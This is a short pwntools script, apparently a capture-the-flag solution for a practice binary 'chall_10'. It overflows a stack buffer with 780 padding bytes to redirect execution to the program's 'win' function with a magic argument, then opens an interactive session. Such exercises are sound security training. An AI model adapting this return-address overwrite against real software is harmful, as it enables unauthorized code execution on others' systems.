from pwn import *
elf=ELF("./chall_10")
#construct the payload
win_addr=p32(elf.sym.win)
magic_value=p32(0x1a55fac3)
payload = b's'*780+win_addr+b's'*4+magic_value
r=process("./chall_10")
r.sendline(payload)
r.interactive()
r.close()
